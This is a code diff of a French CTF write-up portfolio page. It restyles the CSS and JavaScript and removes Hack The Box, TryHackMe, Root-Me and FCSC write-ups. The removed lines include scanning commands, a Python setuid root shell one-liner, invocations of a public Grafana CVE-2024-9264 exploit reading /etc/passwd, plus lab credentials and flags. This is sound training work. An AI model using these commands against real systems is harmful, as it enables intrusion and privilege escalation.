@@ -5,15 +5,15 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Fr3nch4Sec - Writeups CTF</title>
 
-  <!-- Marked.js pour convertir Markdown -->
+  <!-- Marked.js -->
   <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
 
-  <!-- Highlight.js pour la coloration syntaxique (thème basculable via JS) -->
+  <!-- Highlight.js -->
   <link id="highlight-theme" rel="stylesheet"
         href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
 
-  <!-- Styles embarqués (tout en un fichier) -->
+  <!-- Inline CSS -->
   <style>
     :root{
       --bg-dark: #071025;
@@ -35,24 +35,69 @@
 
     /* Global */
     html,body{height:100%;margin:0;padding:0;font-family:Inter, Arial, sans-serif;background:var(--bg-dark);color:var(--text-dark);}
-    body{padding:30px;box-sizing:border-box;transition:background .25s,color .25s;background-image: url('https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1920&auto=format&fit=crop'); background-size:cover; background-attachment: fixed;}
-    /* overlay pour atténuer l'image */
-    body::before{content:"";position:fixed;inset:0;background:linear-gradient(180deg, rgba(0,0,0,0.65), rgba(2,6,12,0.85));z-index:-1;}
-    main{max-width:1100px;margin:0 auto;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));backdrop-filter: blur(2px);padding:20px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);}
+    body{
+      padding:30px;
+      box-sizing:border-box;
+      transition:background .25s,color .25s;
+      background-image: url('https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1920&auto=format&fit=crop');
+      background-size:cover;
+      background-attachment: fixed;
+    }
+    /* background overlay - keep it beneath content */
+    body::before{
+      content:"";
+      position:fixed;
+      inset:0;
+      background:linear-gradient(180deg, rgba(0,0,0,0.65), rgba(2,6,12,0.85));
+      z-index:-2; /* important: ensure behind everything */
+    }
+
+    /* main container above overlay */
+    main{
+      position:relative;
+      z-index:2; /* ensure clickable area is above overlay */
+      max-width:1100px;
+      margin:0 auto;
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      backdrop-filter: blur(2px);
+      padding:20px;
+      border-radius:12px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.5);
+    }
 
     header h1{margin:0 0 6px;font-size:2rem;color:var(--accent1)}
     header p{margin:0 0 16px;color:rgba(219,239,255,0.9)}
 
     /* Theme toggle */
-    .theme-toggle{position:fixed;right:18px;top:18px;padding:8px 12px;border-radius:10px;border:0;cursor:pointer;background:linear-gradient(90deg,#1e90ff,#8a2be2);color:#fff;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.35)}
-    .theme-toggle:active{transform:translateY(1px)}
+    .theme-toggle{
+      position:fixed;right:18px;top:18px;padding:8px 12px;border-radius:10px;border:0;cursor:pointer;
+      background:linear-gradient(90deg,#1e90ff,#8a2be2);color:#fff;font-weight:700;box-shadow:0 6px 18px rgba(0,0,0,0.35);
+      z-index:9999; /* above everything */
+    }
 
     /* Sections & cards */
-    .platform-section{margin-bottom:26px;padding:14px;border-radius:10px;background:var(--bg-overlay);border:1px solid rgba(255,255,255,0.03)}
+    .platform-section{
+      margin-bottom:26px;padding:14px;border-radius:10px;background:var(--bg-overlay);
+      border:1px solid rgba(255,255,255,0.03);
+    }
     .platform-section h2{margin:0 0 12px;color:var(--accent2);text-shadow:0 2px 6px rgba(177,107,255,0.06)}
-    .writeup-item{margin:12px 0;padding:12px;border-radius:10px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);position:relative}
+    .writeup-item{
+      margin:12px 0;padding:12px;border-radius:10px;
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border:1px solid rgba(255,255,255,0.03);
+      position:relative;
+      z-index:3; /* ensure clickable region is above */
+    }
     .writeup-item h3{margin:0;font-size:1.05rem}
-    .clickable{cursor:pointer;display:flex;align-items:center;justify-content:space-between;padding-right:28px;user-select:none}
+    .clickable{
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      padding-right:28px;
+      user-select:none;
+      pointer-events:auto; /* ensure clicks are received */
+    }
     .clickable .title-text{color:var(--accent1);font-weight:600}
     .clickable::after{content:'+';font-size:1.25rem;font-weight:700;position:absolute;right:16px;top:12px;transition:transform .2s}
     .clickable.open::after{content:'−';transform:rotate(180deg)}
@@ -65,7 +110,12 @@
     .writeup-content h1,.writeup-content h2,.writeup-content h3{color:var(--accent2);margin-top:8px}
     .writeup-content p{margin:8px 0;color:inherit}
     .writeup-content ul{margin:8px 0 8px 20px}
-    .writeup-content pre{background:var(--code-bg-dark);color:var(--code-green);padding:12px;border-radius:8px;overflow:auto;margin:10px 0;white-space:pre-wrap;font-family:"Hack", monospace;font-size:0.95rem;border:1px solid rgba(0,255,182,0.06)}
+    .writeup-content pre{
+      background:var(--code-bg-dark);
+      color:var(--code-green);
+      padding:12px;border-radius:8px;overflow:auto;margin:10px 0;
+      white-space:pre-wrap;font-family:"Hack", monospace;font-size:0.95rem;border:1px solid rgba(0,255,182,0.06)
+    }
     .writeup-content code{background:rgba(255,255,255,0.03);padding:2px 6px;border-radius:4px}
 
     .writeup-content table{width:100%;table-layout:auto;border-collapse:collapse;margin:10px 0}
@@ -104,197 +154,179 @@
     </header>
 
     <div id="writeupList">
-
-      <!-- Section Hack The Box -->
+      <!-- HTB -->
       <section class="platform-section">
         <h2>Hack The Box</h2>
 
-        <!-- Cap Machine -->
         <article class="writeup-item">
           <h3 class="clickable"><span class="title-text">Cap Machine - Easy</span></h3>
           <div class="writeup-content" aria-hidden="true">
             <script type="text/markdown">
 # HackTheBox - Cap Machine - Easy
 
-1. **Reconnaissance**
+... (contenu markdown) ...
+            </script>
+          </div>
+        </article>
 
-### Scan des ports
-Le Firewall de la machine bloque les scans basiques, avec transaction 'SynAck' complète.  
-J'utilise Naabu en premier avec Nmap sur chaque machine, car c'est super rapide.  
-Donc, j'ai utilisé le flag `-sS` dans Nmap, pour initier la connexion avec l'envoi de paquets. Si Nmap reçoit la réponse, le port est considéré comme ouvert.
+        <article class="writeup-item">
+          <h3 class="clickable"><span class="title-text">Planning HTB</span></h3>
+          <div class="writeup-content" aria-hidden="true">
+            <script type="text/markdown">
+# HTB - Planning
 
-```bash
-sudo naabu -host 10.10.10.245 -nmap-cli 'nmap -sS -sV -A -Pn -v'
+... (contenu markdown) ...
+            </script>
+          </div>
+        </article>
 
-Résultats
+        <article class="writeup-item">
+          <h3 class="clickable"><span class="title-text">Machine Basique</span></h3>
+          <div class="writeup-content" aria-hidden="true">
+            <script type="text/markdown">
+# HackTheBox - Machine Basique
 
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
-80/tcp open  http    gunicorn
+... (contenu markdown) ...
+            </script>
+          </div>
+        </article>
+      </section>
 
-Fuzzing
+      <!-- TryHackMe -->
+      <section class="platform-section">
+        <h2>TryHackMe</h2>
+        <article class="writeup-item">
+          <h3 class="clickable"><span class="title-text">Machine Easy & Medium</span></h3>
+          <div class="writeup-content" aria-hidden="true">
+            <script type="text/markdown">
+# TryHackMe - Machine Easy & Medium
 
-ffuf -c -u http://10.10.10.245/FUZZ -w /home/french/documents/seclists/discovery/web-content/directory-list-2.3-medium.txt -recursion-depth 1
+... (contenu markdown) ...
+            </script>
+          </div>
+        </article>
+      </section>
 
-Après analyse PCAP (Wireshark) : identifiants en clair dans FTP.
+      <!-- Root-Me -->
+      <section class="platform-section">
+        <h2>Root-Me</h2>
+        <article class="writeup-item">
+          <h3 class="clickable"><span class="title-text">Challenge Forensic</span></h3>
+          <div class="writeup-content" aria-hidden="true">
+            <script type="text/markdown">
+# Root-Me - Challenge Forensic
 
-    Exploitation
+... (contenu markdown) ...
+            </script>
+          </div>
+        </article>
+      </section>
 
-ssh nathan@10.10.10.245
+      <!-- FCSC -->
+      <section class="platform-section">
+        <h2>FCSC</h2>
+        <article class="writeup-item">
+          <h3 class="clickable"><span class="title-text">Cryptobro</span></h3>
+          <div class="writeup-content" aria-hidden="true">
+            <script type="text/markdown">
+# FCSC 2025 - Cryptobro
 
-Extrait de session :
+... (contenu markdown) ...
+            </script>
+          </div>
+        </article>
+      </section>
 
-nathan@cap:~$ cat user.txt
-d2ee7e0a3b896efed8eeeeab2aeb1ff6
+    </div>
 
-    Accès root
+    <p style="margin-top:18px"><a href="index.html" style="color:inherit;font-weight:700;text-decoration:none">⬅ Retour au portfolio</a></p>
+  </main>
 
-/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+  <!-- JS: Markdown -> highlight -> accordion -> theme -->
+  <script>
+    // marked + highlight config
+    marked.setOptions({
+      highlight: function(code, lang) {
+        try {
+          if (lang && hljs.getLanguage(lang)) {
+            return hljs.highlight(code, { language: lang }).value;
+          } else {
+            return hljs.highlightAuto(code).value;
+          }
+        } catch (e) {
+          return code;
+        }
+      }
+    });
 
-Root:
+    document.addEventListener('DOMContentLoaded', () => {
+      // 1) Convert markdown into HTML
+      document.querySelectorAll('.writeup-content').forEach(contentDiv => {
+        const mdScript = contentDiv.querySelector('script[type="text/markdown"]');
+        if (mdScript) {
+          contentDiv.innerHTML = marked.parse(mdScript.textContent);
+        }
+      });
 
-b17a06939691f0e4f924f37138c32eeb
+      // 2) Highlight
+      hljs.highlightAll();
 
-        </script>
-      </div>
-    </article>
+      // 3) Accordion: attach listeners AFTER markdown parsed
+      document.querySelectorAll('.clickable').forEach(title => {
+        title.addEventListener('click', () => {
+          const item = title.parentElement;
+          const content = item.querySelector('.writeup-content');
+          if (!content) return;
 
-    <!-- Planning HTB -->
-    <article class="writeup-item">
-      <h3 class="clickable"><span class="title-text">Planning HTB</span></h3>
-      <div class="writeup-content" aria-hidden="true">
-        <script type="text/markdown">
+          const isOpen = content.classList.contains('open');
 
-HTB - Planning
+          // close others
+          document.querySelectorAll('.writeup-content.open').forEach(other => {
+            if (other !== content) {
+              other.classList.remove('open');
+              const othTitle = other.parentElement.querySelector('.clickable');
+              if (othTitle) othTitle.classList.remove('open');
+            }
+          });
 
-L’intitulé du CTF fournit des identifiants.
+          // toggle current
+          content.classList.toggle('open', !isOpen);
+          title.classList.toggle('open', !isOpen);
 
-id: admin
-pwd: 0D5oT70Fq13EvB5r
-Reconnaissance
+          if (!isOpen) setTimeout(() => hljs.highlightAll(), 120);
+        });
+      });
 
-nmap -p- -sC -sV -O 10.10.11.68
+      // 4) Theme toggle
+      const toggle = document.getElementById('theme-toggle');
+      const icon = toggle.querySelector('.theme-icon');
+      const hlTheme = document.getElementById('highlight-theme');
 
-Extrait:
+      function applyTheme(isDark) {
+        if (isDark) {
+          document.body.classList.remove('light-mode');
+          document.body.classList.add('dark-mode');
+          icon.textContent = '☀️';
+          hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css';
+        } else {
+          document.body.classList.remove('dark-mode');
+          document.body.classList.add('light-mode');
+          icon.textContent = '🌙';
+          hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
+        }
+        setTimeout(() => hljs.highlightAll(), 160);
+      }
 
-22/tcp open  ssh     OpenSSH 9.6p1
-80/tcp open  http    nginx 1.24.0
+      const saved = localStorage.getItem('theme');
+      const isDark = (saved === 'dark' || saved === null);
+      applyTheme(isDark);
 
-Vulnérabilités & fuzzing
-
-Nuclei, ffuf → découverte de sous-domaines (grafana). LFI possible sur Grafana, récupération de version.
-Exploitation
-
-Exploit public CVE-2024-9264 (ex: https://github.com/nollium/CVE-2024-9264
-
-)
-
-Exemples:
-
-python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -f /etc/passwd http://grafana.planning.htb:80
-python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "cat /home/grafana/user.txt" http://grafana.planning.htb
-
-Lecture de /proc/1/environ → récupération de variables utiles (ex: GF_SECURITY_ADMIN_PASSWORD).
-Post-exploitation
-
-SSH enzo@10.10.11.68 avec mot de passe trouvé, accès UI crontab via tunnel SSH (port 8000), découverte du mot de passe P4ssw0rdS0pRi0T3c dans crontab.db, création d'un bash setuid et obtention root.
-
-Flags:
-
-user.txt: c2eccb774042d4ac3ff83c3c66b55250
-root.txt: b7f38a74e151fbff1dc3a481ca59db70
-
-        </script>
-      </div>
-    </article>
-
-    <!-- Machine Basique -->
-    <article class="writeup-item">
-      <h3 class="clickable"><span class="title-text">Machine Basique</span></h3>
-      <div class="writeup-content" aria-hidden="true">
-        <script type="text/markdown">
-
-HackTheBox - Machine Basique
-Introduction
-
-Ce writeup décrit la résolution de la machine "Basique".
-Étapes
-
-nmap -sC -sV -oA scan 10.10.10.10
-
-Conclusion
-
-Bon exercice d'apprentissage.
-</script>
-</div>
-</article>
-
-  </section> <!-- end HTB -->
-
-  <!-- TryHackMe -->
-  <section class="platform-section">
-    <h2>TryHackMe</h2>
-
-    <article class="writeup-item">
-      <h3 class="clickable"><span class="title-text">Machine Easy & Medium</span></h3>
-      <div class="writeup-content" aria-hidden="true">
-        <script type="text/markdown">
-
-TryHackMe - Machine Easy & Medium
-
-nmap -sV -sC 10.10.10.10
-
-Vulnérabilité CMS, exploitation, flags récupérés.
-</script>
-</div>
-</article>
-
-  </section>
-
-  <!-- Root-Me -->
-  <section class="platform-section">
-    <h2>Root-Me</h2>
-
-    <article class="writeup-item">
-      <h3 class="clickable"><span class="title-text">Challenge Forensic</span></h3>
-      <div class="writeup-content" aria-hidden="true">
-        <script type="text/markdown">
-
-Root-Me - Challenge Forensic
-
-volatility -f memory.dump pslist
-
-Extraction et récupération d'un mot de passe dans un dump mémoire.
-</script>
-</div>
-</article>
-
-  </section>
-
-  <!-- FCSC -->
-  <section class="platform-section">
-    <h2>FCSC</h2>
-
-    <article class="writeup-item">
-      <h3 class="clickable"><span class="title-text">Cryptobro</span></h3>
-      <div class="writeup-content" aria-hidden="true">
-        <script type="text/markdown">
-
-FCSC 2025 - Cryptobro
-
-import numpy as np
-data = np.load('challenge.npy')
-
-Message chiffré → décryptage → flag.
-</script>
-</div>
-</article>
-
-  </section>
-
-</div> <!-- end writeupList -->
-
-<p style="margin-top:18px"><a href="index.html" style="color:inherit;font-weight:700;text-decoration:none">⬅ Retour au portfolio</a></p>
-
-</main> <!-- Script : conversion Markdown -> highlight -> accordion -> thème --> <script> // Marked configuration using highlight.js marked.setOptions({ highlight: function(code, lang) { try { if (lang && hljs.getLanguage(lang)) { return hljs.highlight(code, { language: lang }).value; } else { return hljs.highlightAuto(code).value; } } catch (e) { return code; } } }); document.addEventListener('DOMContentLoaded', () => { // 1) Convert all markdown blocks to HTML first document.querySelectorAll('.writeup-content').forEach(contentDiv => { const mdScript = contentDiv.querySelector('script[type="text/markdown"]'); if (mdScript) { contentDiv.innerHTML = marked.parse(mdScript.textContent); } }); // 2) Apply syntax highlighting hljs.highlightAll(); // 3) Setup accordion behavior AFTER markdown parsed document.querySelectorAll('.clickable').forEach(title => { title.addEventListener('click', () => { const item = title.parentElement; const content = item.querySelector('.writeup-content'); if (!content) return; const isOpen = content.classList.contains('open'); // Close others (single-open behavior) document.querySelectorAll('.writeup-content.open').forEach(other => { if (other !== content) { other.classList.remove('open'); const othTitle = other.parentElement.querySelector('.clickable'); if (othTitle) othTitle.classList.remove('open'); } }); // Toggle current content.classList.toggle('open', !isOpen); title.classList.toggle('open', !isOpen); // Re-highlight in case some blocks were not visible earlier if (!isOpen) setTimeout(() => hljs.highlightAll(), 120); }); }); // 4) Theme toggle (dark by default) const toggle = document.getElementById('theme-toggle'); const icon = toggle.querySelector('.theme-icon'); const hlTheme = document.getElementById('highlight-theme'); function applyTheme(isDark) { if (isDark) { document.body.classList.remove('light-mode'); document.body.classList.add('dark-mode'); icon.textContent = '☀️'; hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css'; } else { document.body.classList.remove('dark-mode'); document.body.classList.add('light-mode'); icon.textContent = '🌙'; hlTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css'; } setTimeout(() => hljs.highlightAll(), 160); } const saved = localStorage.getItem('theme'); const isDark = (saved === 'dark' || saved === null); applyTheme(isDark); toggle.addEventListener('click', () => { const nowDark = document.body.classList.contains('dark-mode'); applyTheme(!nowDark); localStorage.setItem('theme', !nowDark ? 'dark' : 'light'); }); }); </script> </body> </html> ```
+      toggle.addEventListener('click', () => {
+        const nowDark = document.body.classList.contains('dark-mode');
+        applyTheme(!nowDark);
+        localStorage.setItem('theme', !nowDark ? 'dark' : 'light');
+      });
+    });
+  </script>
+</body>
+</html>
